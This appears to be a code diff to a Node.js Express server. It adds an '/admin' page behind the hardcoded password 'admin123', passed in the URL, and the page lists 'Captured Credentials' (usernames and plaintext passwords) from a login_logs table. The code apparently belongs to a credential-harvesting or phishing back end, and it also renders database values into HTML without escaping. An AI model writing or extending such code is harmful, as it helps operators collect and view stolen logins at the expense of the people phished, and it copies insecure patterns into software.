@@ -96,3 +96,37 @@ app.get('/view-logins', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 Server running at http://localhost:${PORT}`);
 });
+// Simple password protection middleware
+const adminPassword = 'admin123'; // You can change this
+
+app.get('/admin', (req, res) => {
+  const password = req.query.pass;
+
+  if (password !== adminPassword) {
+    return res.send(`
+      <h2>🔒 Admin Access Required</h2>
+      <form method="GET" action="/admin">
+        <input type="password" name="pass" placeholder="Enter admin password" required />
+        <button type="submit">Enter</button>
+      </form>
+    `);
+  }
+
+  db.all('SELECT * FROM login_logs ORDER BY id DESC', (err, rows) => {
+    if (err) {
+      console.error(err);
+      res.status(500).send('Error fetching data');
+    } else {
+      let html = `
+        <h2>📋 Captured Credentials</h2>
+        <table border="1" cellpadding="8" cellspacing="0">
+          <tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th></tr>
+      `;
+      rows.forEach(row => {
+        html += `<tr><td>${row.id}</td><td>${row.username}</td><td>${row.password}</td><td>${row.time}</td></tr>`;
+      });
+      html += '</table>';
+      res.send(html);
+    }
+  });
+});
